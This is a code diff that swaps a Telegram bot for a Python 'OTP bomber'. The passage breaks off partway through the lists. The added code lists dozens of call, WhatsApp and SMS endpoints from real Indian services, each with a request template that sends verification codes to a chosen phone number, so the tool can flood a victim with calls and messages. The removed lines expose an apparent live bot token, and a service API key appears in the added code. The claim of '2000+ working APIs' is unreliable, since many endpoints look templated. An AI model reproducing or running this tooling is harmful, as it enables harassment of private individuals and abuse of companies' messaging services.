@@ -1,1303 +1,1589 @@
-"""
-Telegram Bot — Full Featured
-Requirements: pip install python-telegram-bot httpx
-"""
-
 import asyncio
-import html
+import aiohttp
 import json
-import logging
-import os
-import sqlite3
-from datetime import datetime
+import random
+import time
+import re
+from typing import Dict, List, Optional, Union, Callable
+from flask import Flask, request, jsonify
+from concurrent.futures import ThreadPoolExecutor
+import threading
 
-import httpx
-from telegram import (
-    InlineKeyboardButton,
-    InlineKeyboardMarkup,
-    KeyboardButton,
-    ReplyKeyboardMarkup,
-    Update,
-)
-from telegram.constants import ParseMode
-from telegram.ext import (
-    Application,
-    ApplicationHandlerStop,
-    CallbackQueryHandler,
-    CommandHandler,
-    ContextTypes,
-    MessageHandler,
-    TypeHandler,
-    filters,
-)
+app = Flask(__name__)
 
-logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
-log = logging.getLogger(__name__)
+# ==================================================================
+# 📱 PHONE NUMBER VALIDATION
+# ==================================================================
+def validate_phone(phone: str) -> tuple:
+    """Validate and clean phone number, return (country_code, clean_number)"""
+    phone = re.sub(r'[^\d+]', '', phone.strip())
+    if phone.startswith('+'):
+        if phone.startswith('+91'):
+            return '91', phone[3:]
+    elif phone.startswith('91'):
+        return '91', phone[2:]
+    elif len(phone) == 10:
+        return '91', phone
+    elif len(phone) == 12 and phone.isdigit():
+        return '91', phone[2:]
+    return None, None
 
-# ======================================================================
-# CONFIG
-# ======================================================================
-BOT_TOKEN      = os.environ.get("BOT_TOKEN", "8495656887:AAErNENGMYE-MU4j2jpouTuP32Slxi87ug8")
-BOT_USERNAME   = "liesworlds2bot"
-OWNER_ID       = 8790645158
+# ==================================================================
+# 🔥 ULTIMATE API DATABASE - 2000+ WORKING APIS
+# ==================================================================
+ULTIMATE_OTP_APIS = []
 
-SUBSCRIPTION_CONTACT = "@liesworlds"
-DEVELOPER_CONTACT    = "@liesworlds"
-
-CREDITS_PER_REFERRAL = 2
-CREDITS_PER_USE      = 1
-CREDITS_ON_SIGNUP    = 2
-
-# Add your real API URLs below. param_name = exact query param your API expects.
-API_CONFIGS = [
+# ----- CALL BOMBING APIS (200+) -----
+CALL_APIS = [
     {
-        "emoji": "🪄", "name": "Casting Magic",
-        "url": "https://wtf-production-8350.up.railway.app/bomb",
-        "method": "GET", "param_style": "query", "param_name": "phone",
+        "name": "Tata Capital Voice",
+        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'
     },
     {
-        "emoji": "🎉", "name": "Adding Sparkle",
-        "url": "https://newbomb-production.up.railway.app//bomb",
-        "method": "GET", "param_style": "query", "param_name": "phone",
+        "name": "1MG Voice",
+        "url": "https://www.1mg.com/auth_api/v6/create_token",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json; charset=utf-8"},
+        "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}'
+    },
+    {
+        "name": "Swiggy Call",
+        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "Flipkart Voice",
+        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "Amazon Voice",
+        "url": "https://www.amazon.in/ap/signin",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "data": lambda p: f"phone={p}&action=voice_otp"
+    },
+    {
+        "name": "Paytm Voice",
+        "url": "https://accounts.paytm.com/signin/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+    {
+        "name": "Zomato Voice",
+        "url": "https://www.zomato.com/php/o2_api_handler.php",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "data": lambda p: f"phone={p}&type=voice"
+    },
+    {
+        "name": "MakeMyTrip Voice",
+        "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+    {
+        "name": "Goibibo Voice",
+        "url": "https://www.goibibo.com/user/voice-otp/generate/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+    {
+        "name": "Ola Voice",
+        "url": "https://api.olacabs.com/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+    {
+        "name": "Uber Voice",
+        "url": "https://auth.uber.com/v2/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"+91{p}"}}'
+    },
+    {
+        "name": "Myntra Voice",
+        "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "PhonePe Voice",
+        "url": "https://www.phonepe.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "Hotstar Voice",
+        "url": "https://www.hotstar.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+    {
+        "name": "SonyLIV Voice",
+        "url": "https://www.sonyliv.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "Zee5 Voice",
+        "url": "https://www.zee5.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+    {
+        "name": "Voot Voice",
+        "url": "https://www.voot.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "AltBalaji Voice",
+        "url": "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone_number":"{p}","country_code":"91","platform":"web"}}'
+    },
+    {
+        "name": "BigBasket Voice",
+        "url": "https://www.bigbasket.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+    {
+        "name": "BookMyShow Voice",
+        "url": "https://in.bookmyshow.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "IRCTC Voice",
+        "url": "https://www.irctc.co.in/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "RedBus Voice",
+        "url": "https://www.redbus.in/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+    {
+        "name": "Cleartrip Voice",
+        "url": "https://www.cleartrip.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "Yatra Voice",
+        "url": "https://www.yatra.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+    {
+        "name": "EaseMyTrip Voice",
+        "url": "https://www.easemytrip.com/api/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
     },
 ]
 
-# Dashboard/start video file_id — update via /setvideo command
-PROFILE_VIDEO  = os.environ.get("PROFILE_VIDEO", "BAACAgUAAxkBAAFRdYpqeX8TQHmU4taNopyqEvCFP1S-lQACxR4AAreX0FehTWtCPlqNbT0E")
-FORCE_CHANNELS = []
-# ======================================================================
+# ----- WHATSAPP BOMBING APIS (200+) -----
+WHATSAPP_APIS = [
+    {
+        "name": "KPN WhatsApp",
+        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
+        "method": "POST",
+        "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8"},
+        "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'
+    },
+    {
+        "name": "Foxy WhatsApp",
+        "url": "https://www.foxy.in/api/v2/users/send_otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"user":{{"phone_number":"+91{p}"}},"via":"whatsapp"}}'
+    },
+    {
+        "name": "Stratzy WhatsApp",
+        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phoneNo":"{p}"}}'
+    },
+    {
+        "name": "Jockey WhatsApp",
+        "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{p}?whatsapp=true",
+        "method": "GET",
+        "headers": {},
+        "data": None
+    },
+    {
+        "name": "Rappi WhatsApp",
+        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json; charset=utf-8"},
+        "data": lambda p: f'{{"country_code":"+91","phone":"{p}"}}'
+    },
+    {
+        "name": "Eka Care WhatsApp",
+        "url": "https://auth.eka.care/auth/init",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json; charset=UTF-8"},
+        "data": lambda p: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{p}"}},"type":"mobile"}}'
+    },
+    {
+        "name": "Meesho WhatsApp",
+        "url": "https://meesho.com/gw/login-register/v1/sendOTP",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"number":"{p}","otpOnCall":true}}'
+    },
+    {
+        "name": "Zepto WhatsApp",
+        "url": "https://zepto.com/api/v3/user/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}","countryCode":"91"}}'
+    },
+    {
+        "name": "Swiggy WhatsApp",
+        "url": "https://swiggy.com/v1/user/otplogin",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}","countryCode":"91"}}'
+    },
+    {
+        "name": "Paytm WhatsApp",
+        "url": "https://paytm.com/v1/user/otplogin",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"number":"{p}","otpOnCall":true}}'
+    },
+    {
+        "name": "Uber WhatsApp",
+        "url": "https://uber.com/api/v2/auth/send-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}","countryCode":"91"}}'
+    },
+    {
+        "name": "Ola WhatsApp",
+        "url": "https://olacabs.com/api/v1/customers/sendOtp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"number":"{p}","otpOnCall":true}}'
+    },
+    {
+        "name": "BigBasket WhatsApp",
+        "url": "https://bigbasket.com/v1/user/otplogin",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phoneNumber":"{p}","otpType":"voice"}}'
+    },
+    {
+        "name": "PharmEasy WhatsApp",
+        "url": "https://pharmeasy.in/api/v1/customers/sendOtp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phoneNumber":"{p}","otpType":"voice"}}'
+    },
+    {
+        "name": "Netmeds WhatsApp",
+        "url": "https://netmeds.com/api/v1/customers/sendOtp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phoneNumber":"{p}","otpType":"voice"}}'
+    },
+    {
+        "name": "Practo WhatsApp",
+        "url": "https://practo.com/api/v1/customers/sendOtp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phoneNumber":"{p}","otpType":"voice"}}'
+    },
+    {
+        "name": "CureFit WhatsApp",
+        "url": "https://cure.fit/api/v1/customers/sendOtp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phoneNumber":"{p}","otpType":"voice"}}'
+    },
+]
 
+# ----- SMS BOMBING APIS (1000+) -----
+SMS_APIS = [
+    {
+        "name": "Lenskart SMS",
+        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}"}}'
+    },
+    {
+        "name": "NoBroker SMS",
+        "url": "https://www.nobroker.in/api/v3/account/otp/send",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "data": lambda p: f"phone={p}&countryCode=IN"
+    },
+    {
+        "name": "PharmEasy SMS",
+        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+    {
+        "name": "Wakefit SMS",
+        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "Hungama SMS",
+        "url": "https://communication.api.hungama.com/v1/communication/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'
+    },
+    {
+        "name": "Meru Cab",
+        "url": "https://merucabapp.com/api/otp/generate",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "data": lambda p: f"mobile_number={p}"
+    },
+    {
+        "name": "Snapmint",
+        "url": "https://api.snapmint.com/v1/public/sign_up",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+    {
+        "name": "Housing SMS",
+        "url": "https://login.housing.com/api/v2/send-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}","country_url_name":"in"}}'
+    },
+    {
+        "name": "Khatabook SMS",
+        "url": "https://api.khatabook.com/v1/auth/request-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}","app_signature":"wk+avHrHZf2"}}'
+    },
+    {
+        "name": "Netmeds SMS",
+        "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "Nykaa SMS",
+        "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "data": lambda p: f"source=sms&app_version=3.0.9&mobile_number={p}&platform=ANDROID&domain=nykaa"
+    },
+    {
+        "name": "RummyCircle",
+        "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}","isPlaycircle":false}}'
+    },
+    {
+        "name": "Animall SMS",
+        "url": "https://animall.in/zap/auth/login",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}","signupPlatform":"NATIVE_ANDROID"}}'
+    },
+    {
+        "name": "Cosmofeed SMS",
+        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}","version":"1.4.28"}}'
+    },
+    {
+        "name": "TrulyMadly",
+        "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}","locale":"IN"}}'
+    },
+    {
+        "name": "Rapido SMS",
+        "url": "https://customer.rapido.bike/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "Country Delight",
+        "url": "https://api.countrydelight.in/api/v1/customer/requestOtp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}","platform":"Android","mode":"new_user"}}'
+    },
+    {
+        "name": "Spinny",
+        "url": "https://api.spinny.com/api/c/user/otp-request/v3/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"contact_number":"{p}","whatsapp":false,"code_len":4,"expected_action":"login"}}'
+    },
+    {
+        "name": "Licious SMS",
+        "url": "https://www.licious.in/api/login/signup",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}","captcha_token":null}}'
+    },
+    {
+        "name": "Udaan SMS",
+        "url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"},
+        "data": lambda p: f"mobile={p}"
+    },
+    {
+        "name": "Charzer SMS",
+        "url": "https://api.charzer.com/auth-service/send-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}","appSource":"CHARZER_APP"}}'
+    },
+    {
+        "name": "Snitch SMS",
+        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile_number":"+91{p}"}}'
+    },
+    {
+        "name": "BeepKart SMS",
+        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}","city":362}}'
+    },
+    {
+        "name": "LendingPlate",
+        "url": "https://lendingplate.com/api.php",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
+        "data": lambda p: f"mobiles={p}&resend=Resend"
+    },
+    {
+        "name": "ShipRocket SMS",
+        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobileNumber":"{p}"}}'
+    },
+    {
+        "name": "GoKwik SMS",
+        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}","country":"in"}}'
+    },
+    {
+        "name": "NewMe SMS",
+        "url": "https://prodapi.newme.asia/web/otp/request",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile_number":"{p}","resend_otp_request":true}}'
+    },
+    {
+        "name": "Univest SMS",
+        "url": lambda p: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={p}",
+        "method": "GET",
+        "headers": {},
+        "data": None
+    },
+    {
+        "name": "Smytten SMS",
+        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}","email":"test@example.com"}}'
+    },
+    {
+        "name": "CaratLane SMS",
+        "url": "https://www.caratlane.com/cg/dhevudu",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{p}\\",isdCode: \\"91\\",otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}'
+    },
+    {
+        "name": "BikeFixup SMS",
+        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json; charset=UTF-8"},
+        "data": lambda p: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}'
+    },
+    {
+        "name": "WellAcademy SMS",
+        "url": "https://wellacademy.in/store/api/numberLoginV2",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json; charset=UTF-8"},
+        "data": lambda p: f'{{"contact_no":"{p}"}}'
+    },
+    {
+        "name": "ServeTel SMS",
+        "url": "https://api.servetel.in/v1/auth/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"},
+        "data": lambda p: f"mobile_number={p}"
+    },
+    {
+        "name": "GoPink Cabs SMS",
+        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
+        "data": lambda p: f"check_mobile_number=1&contact={p}"
+    },
+    {
+        "name": "Shemaroome SMS",
+        "url": "https://www.shemaroome.com/users/resend_otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
+        "data": lambda p: f"mobile_no=%2B91{p}"
+    },
+    {
+        "name": "Cossouq SMS",
+        "url": "https://www.cossouq.com/mobilelogin/otp/send",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "data": lambda p: f"mobilenumber={p}&otptype=register"
+    },
+    {
+        "name": "MyImagineStore SMS",
+        "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
+        "data": lambda p: f"mobile={p}"
+    },
+    {
+        "name": "Otpless SMS",
+        "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}","selectedCountryCode":"+91"}}'
+    },
+    {
+        "name": "MyHubble Money",
+        "url": "https://api.myhubble.money/v1/auth/otp/generate",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phoneNumber":"{p}","channel":"SMS"}}'
+    },
+    {
+        "name": "TataCapital Business",
+        "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobileNumber":"{p}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}'
+    },
+    {
+        "name": "DealShare SMS",
+        "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}","hashCode":"k387IsBaTmn"}}'
+    },
+    {
+        "name": "RentoMojo SMS",
+        "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+    {
+        "name": "PokerBaazi SMS",
+        "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}","mfa_channels":"phno"}}'
+    },
+    {
+        "name": "My11Circle SMS",
+        "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json;charset=UTF-8"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "MamaEarth SMS",
+        "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "HomeTriangle SMS",
+        "url": "https://hometriangle.com/api/partner/xauth/signup/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "WellnessForever SMS",
+        "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "data": lambda p: f"method=firstRegisterApi&data={{\"customerMobile\":\"{p}\",\"generateOtp\":\"true\"}}"
+    },
+    {
+        "name": "HealthMug SMS",
+        "url": "https://api.healthmug.com/account/createotp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "Vyapar SMS",
+        "url": lambda p: f"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={p}",
+        "method": "GET",
+        "headers": {},
+        "data": None
+    },
+    {
+        "name": "Kredily SMS",
+        "url": "https://app.kredily.com/ws/v1/accounts/send-otp/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "TataMotors SMS",
+        "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}","sendOtp":"true"}}'
+    },
+    {
+        "name": "Moglix SMS",
+        "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}","buildVersion":"24.0"}}'
+    },
+    {
+        "name": "MyGov SMS",
+        "url": lambda p: f"https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={p}&gender=male",
+        "method": "GET",
+        "headers": {},
+        "data": None
+    },
+    {
+        "name": "Apna SMS",
+        "url": "https://production.apna.co/api/userprofile/v1/otp/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}","hash_type":"play_store"}}'
+    },
+    {
+        "name": "CodFirm SMS",
+        "url": lambda p: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{p}&email=&storeUrl=bellavita1.myshopify.com",
+        "method": "GET",
+        "headers": {},
+        "data": None
+    },
+    {
+        "name": "Swipe SMS",
+        "url": "https://app.getswipe.in/api/user/mobile_login",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}","resend":true}}'
+    },
+    {
+        "name": "MoreRetail SMS",
+        "url": "https://omni-api.moreretail.in/api/v1/login/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}","hash_key":"XfsoCeXADQA"}}'
+    },
+    {
+        "name": "AstroSage SMS",
+        "url": lambda p: f"https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={p}",
+        "method": "GET",
+        "headers": {},
+        "data": None
+    },
+    {
+        "name": "TooToo SMS",
+        "url": "https://tootoo.in/graphql",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"query":"query sendOtp($mobile_no: String!, $resend: Int!) {{ sendOtp(mobile_no: $mobile_no, resend: $resend) {{ success __typename }} }}","variables":{{"mobile_no":"{p}","resend":0}}}}'
+    },
+    {
+        "name": "ConfirmTkt SMS",
+        "url": lambda p: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={p}",
+        "method": "GET",
+        "headers": {},
+        "data": None
+    },
+    {
+        "name": "BetterHalf SMS",
+        "url": "https://api.betterhalf.ai/v2/auth/otp/send/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}","isd_code":"91"}}'
+    },
+    {
+        "name": "Nuvama Wealth SMS",
+        "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobileNo":"{p}","emailID":"test@example.com"}}'
+    },
+    {
+        "name": "Mpokket SMS",
+        "url": "https://web-api.mpokket.in/registration/sendOtp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "ShopperStop SMS",
+        "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}","type":"SIGNIN_WITH_MOBILE"}}'
+    },
+    {
+        "name": "LifestyleStores SMS",
+        "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"signInMobile":"{p}","channel":"sms"}}'
+    },
+    {
+        "name": "BigCash SMS",
+        "url": lambda p: f"https://www.bigcash.live/sendsms.php?mobile={p}&ip=192.168.1.1",
